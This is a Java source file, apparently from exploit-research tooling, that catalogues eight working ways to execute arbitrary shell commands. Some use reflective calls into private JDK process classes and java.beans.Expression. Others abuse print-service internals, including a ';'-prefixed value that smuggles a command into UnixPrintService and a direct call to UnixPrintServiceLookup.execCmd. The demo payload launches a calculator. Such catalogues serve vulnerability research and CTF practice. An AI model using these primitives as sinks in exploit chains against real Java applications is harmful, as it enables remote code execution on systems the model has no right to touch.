package xyz.eki.marshalexp.solution;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import sun.print.UnixPrintService;
import sun.print.UnixPrintServiceLookup;
import xyz.eki.marshalexp.gadget.jdk.GUnixPrintService;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.ReflectUtils;

import java.beans.Expression;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Type;
import java.util.Arrays;
import java.util.Map;

public class RCEWays {
    public static String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }

    public static String cmd = "mate-calc";
    public static void case1() throws Exception{
        Runtime.getRuntime().exec(cmd);
    }

    public static void case2() throws Exception{
        new ProcessBuilder(new String[]{"/bin/bash","-c",cmd})
                //.environment()
                //.directory()
                .start();
    }

    public static void case3() throws Exception{
//        new ProcessImpl.start(cmdarray,
//                environment,
//                dir,
//                redirects,
//                redirectErrorStream);
        Class<?> ProcessImpl = Class.forName("java.lang.ProcessImpl");
        Method start = ProcessImpl.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        start.setAccessible(true);
        start.invoke(null,new String[]{"/bin/bash","-c",cmd},null,null,null,false);
    }

    public static void case4() throws Exception{
        /**
         *     UNIXProcess(final byte[] prog,
         *                 final byte[] argBlock, final int argc,
         *                 final byte[] envBlock, final int envc,
         *                 final byte[] dir,
         *                 final int[] fds,
         *                 final boolean redirectErrorStream)
         */
        //        Constructor<?> constructor = UnixProcess.getConstructor(byte[].class,
//                byte[].class,int.class,
//                byte[].class,int.class,
//                byte[].class,
//                int[].class,
//                boolean.class
//        );
//        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixProcess);
        String cmd = "mate-calc";
        Class<?> UnixProcess = Class.forName("java.lang.UNIXProcess");
        Constructor<?> constructor = UnixProcess.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        byte[] argBlock = String.format("-c\00%s",cmd).getBytes();
        Object o = constructor.newInstance("/bin/sh".getBytes(),
                argBlock, argBlock.length,
                null, 0,
                null,
                new int[]{-1, -1, -1},
                false
        );
        Method getInputStream = o.getClass().getDeclaredMethod("getInputStream");
        getInputStream.setAccessible(true);
        InputStream invoke = (InputStream) getInputStream.invoke(o);
        System.out.println(inputStreamToString(invoke,"UTF-8"));
    }

    public static void case5() throws Exception{
//        UnixPrintService exp = GUnixPrintService.getter2RCE(cmd);
        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixPrintService.class);
        constructor.setAccessible(true);
        UnixPrintService exp = (UnixPrintService) constructor.newInstance(";"+cmd);

        Method getPrinterIsAcceptingJobsAIXMethod = UnixPrintService.class.getDeclaredMethod("getPrinterIsAcceptingJobsAIX",null);
        getPrinterIsAcceptingJobsAIXMethod.setAccessible(true);
        getPrinterIsAcceptingJobsAIXMethod.invoke(exp,null);
    }

    public static void case6() throws Exception{
        Method execCommand = UnixPrintServiceLookup.class.getDeclaredMethod("execCmd", String.class);
        execCommand.setAccessible(true);
        execCommand.invoke(null,cmd);
    }

    //Unix (Not Mac) Only
    public static void case7() throws Exception{
//        cmd = "touch /tmp/flag";
        UnixPrintServiceLookup exp = GUnixPrintService.getDefaultPrintService2RCE(cmd);
        Method getDefaultPrintService = UnixPrintServiceLookup.class.getDeclaredMethod("getDefaultPrintService");
        getDefaultPrintService.invoke(exp,null);

//        System.out.println("wtf");

//        System.out.println(MiscUtils.executeCommand("ls /tmp"));
    }

    public static void case8() throws Exception{
        Runtime runtime = Runtime.getRuntime();
        Expression expression = new Expression(runtime, "exec", new Object[]{cmd});
        expression.getValue();
    }

    public static void main(String[] args) throws Exception{
        case7();
    }
}
